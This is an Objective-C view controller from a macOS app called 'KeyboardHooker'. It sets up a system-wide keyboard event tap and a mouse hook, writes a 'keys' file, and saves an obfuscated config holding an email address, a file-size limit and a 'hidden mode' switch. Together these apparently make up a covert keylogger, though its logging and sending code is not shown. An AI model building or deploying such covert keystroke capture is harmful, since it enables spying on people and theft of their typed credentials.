//
//  ViewController.m
//  KeyboardHooker
//
//  Created by Иван on 21.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "ViewController.h"
#import <SystemConfiguration/SystemConfiguration.h>

@implementation ViewController

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    int key = (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    /*
    if ([Time currentTimeSince1970InMilliseconds] - ((__bridge ViewController*)refcon).start <= ((__bridge ViewController*)refcon).delay) {
        NSString *keyString = [KeycodeEncrypter keyStringFromKeyCode:key];
        if ([((__bridge ViewController*)refcon).toBlock containsString:keyString]) {
            return nil;
        }
    }
     */
    
    //((__bridge ViewController*)refcon).index = [(__bridge ViewController*)refcon check:key];
     /*
    if (((__bridge ViewController*)refcon).index != -1) {
        ((__bridge ViewController*)refcon).start = [Time currentTimeSince1970InMilliseconds];
        ((__bridge ViewController*)refcon).delay = ((__bridge ViewController*)refcon).buttonsBlockArray[((__bridge ViewController*)refcon).index].delay;
        ((__bridge ViewController*)refcon).toBlock = ((__bridge ViewController*)refcon).buttonsBlockArray[((__bridge ViewController*)refcon).index].blockKeys;
    }
    */
    
    if ([((__bridge ViewController*)refcon).keyBlocker blockCycle:key]) {
        return nil;
    }
     
    /*
    if ([(__bridge ViewController*)refcon pressAddFlag] == YES) {
        if (((__bridge ViewController*)refcon).index == -1) {
            BlockItem *item = [[BlockItem alloc] init:key :0 :[Time currentTimeSince1970InMilliseconds]];
            [[(__bridge ViewController*)refcon buttonsBlockArray] addObject:item];
            [((__bridge ViewController*)refcon).tableView reloadData];
        }
        ((__bridge ViewController*)refcon).pressAddFlag = NO;
        [((__bridge ViewController*)refcon).addBlockButton setEnabled:YES];
    }
     */
    
    [[(__bridge ViewController*)refcon key] doFullCycle:key];
    return event;
}

- (int)check: (NSInteger)key {
    int i = 0;
    for (BlockItem *item in _buttonsBlockArray) {
        if (item.key == key) {
            return i;
        }
        i++;
    }
    return -1;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    _buttonsBlockArray = [[NSMutableArray alloc] init];
    _pressAddFlag = false;
    
    [_emailTextField setDelegate:self];
    [_fileSize setDelegate:self];
    
    [_tableView setDelegate:self];
    [_tableView setDataSource:self];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(editingDidEnd:) name:NSControlTextDidEndEditingNotification object:nil];
    
    [FileManager createFile:@"keys"];
    [FileManager createFile:@"buttons"];
    
    _mouse = [[MouseHooker alloc] init];
    _key = [[KeyHooker alloc] init:_mouse];
    _keyBlocker = [[BlockKeyManager alloc] init:_buttonsBlockArray :self];
    
    [KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void*)(self)];
    [_mouse setMouseNotifications];
}

- (void)controlTextDidChange: (NSNotification*)notification {
    NSTextField *textField = [notification object];
    
    if ([textField tag] == 1) {
        if (![RegexManager validateEmail:[_emailTextField stringValue]]) {
            [_emailTextField setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            emailFlag = NO;
        } else {
            [_emailTextField setTextColor:[NSColor blackColor]];
            emailFlag = YES;
        }
    }
    
    if ([textField tag] == 2) {
        if ([[textField stringValue] length] >= 7) {
            [textField setStringValue:[[textField stringValue] substringToIndex:[[textField stringValue] length] - 1]];
        }
        if (![RegexManager validateDigitsOnly:[_fileSize stringValue]]) {
            [_fileSize setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            sizeFlag = NO;
        } else {
            [_fileSize setTextColor:[NSColor blackColor]];
            sizeFlag = YES;
        }
    }
    
    if (emailFlag && sizeFlag) {
        [_saveButton setEnabled: YES];
    }
}

- (IBAction)clickedSaveButton:(id)sender {
    [FileManager createFile:@"config"];
    
    if ([RegexManager validateEmail:[_emailTextField stringValue]] && [RegexManager validateDigitsOnly:[_fileSize stringValue]]) {
        NSString *email = [Cryptographer doIt:[_emailTextField stringValue]];
        NSString *size = [Cryptographer doIt:[_fileSize stringValue]];
        NSString *mode = [Cryptographer doIt:[NSString stringWithFormat:@"%ld", (long)[_hiddenModeSwitch state]]];
        
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", email]];
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", size]];
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@", mode]];
    }
}

// MARK: - BlockKeyManager delegate methods
- (void)reloadTable {
    [_tableView reloadData];
}

- (void)unlockAddButton {
    [_addBlockButton setEnabled:YES];
}

// MARK: - TableView delegate methods
- (NSView*)tableView:(NSTableView *)tableView viewForTableColumn:(NSTableColumn *)tableColumn row:(NSInteger)row {
    NSTableCellView *cellView = [tableView makeViewWithIdentifier:@"Button" owner:self];
    
    if ([tableColumn.identifier isEqualToString:@"Button"]) {
        cellView = [tableView makeViewWithIdentifier:@"b" owner:self];
        NSString *str = [NSString stringWithFormat:@"%ld (%@)", (long)_buttonsBlockArray[row].key, [KeycodeEncrypter keyStringFromKeyCode:(long long)_buttonsBlockArray[row].key]];
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@"-"];
        }
    } else if ([tableColumn.identifier isEqualToString:@"DelayTime"]) {
        cellView = [tableView makeViewWithIdentifier:@"d" owner:self];
        NSString *str = [NSString stringWithFormat:@"%ld", (long)_buttonsBlockArray[row].delay];
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@"-"];
        }
    } else if ([tableColumn.identifier isEqualToString:@"BlockKeys"]) {
        cellView = [tableView makeViewWithIdentifier:@"k" owner:self];
        NSString *str = _buttonsBlockArray[row].blockKeys;
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@""];
        }
    }
    
    return cellView;
}

- (NSInteger)numberOfRowsInTableView:(NSTableView *)tableView {
    return [_buttonsBlockArray count];
}

- (void)tableViewSelectionDidChange:(NSNotification *)notification {
    NSInteger row = [notification.object selectedRow];
    if (row >= 0) {
        selectedRow = row;
    }
}

- (void)editingDidEnd: (NSNotification*)notification {
    NSString *text = [[notification object] stringValue];
    
    if ([[notification object] tag] == 1000) {
        if ([RegexManager validateDigitsOnly:text]) {
            _buttonsBlockArray[selectedRow].delay = [text integerValue];
            [_tableView reloadData];
        } else {
            [[notification object] setStringValue:[NSString stringWithFormat:@"%ld", _buttonsBlockArray[selectedRow].delay]];
        }
    } else if ([[notification object] tag] == 1001) {
        NSString *key = [KeycodeEncrypter keyStringFromKeyCode:_buttonsBlockArray[selectedRow].key];
        if (/*[RegexManager validateLowCaseOnly:text] && */[text containsString:key] == NO) {
            _buttonsBlockArray[selectedRow].blockKeys = [NSMutableString stringWithFormat:@"%@", text];
            [_tableView reloadData];
        } else {
            [[notification object] setStringValue:_buttonsBlockArray[selectedRow].blockKeys];
        }
        
    }
}

// MARK: - button clicks
- (IBAction)clickedDeleteButton:(id)sender {
    NSInteger currentRow = [_tableView selectedRow];
    if (currentRow >=0) {
        [_buttonsBlockArray removeObjectAtIndex:currentRow];
        [_tableView reloadData];
    }
}

- (IBAction)addKey:(id)sender {
    [[self keyBlocker] setPressAddFlag:YES];
    //_pressAddFlag = YES;
    [sender setEnabled:false];
}

@end
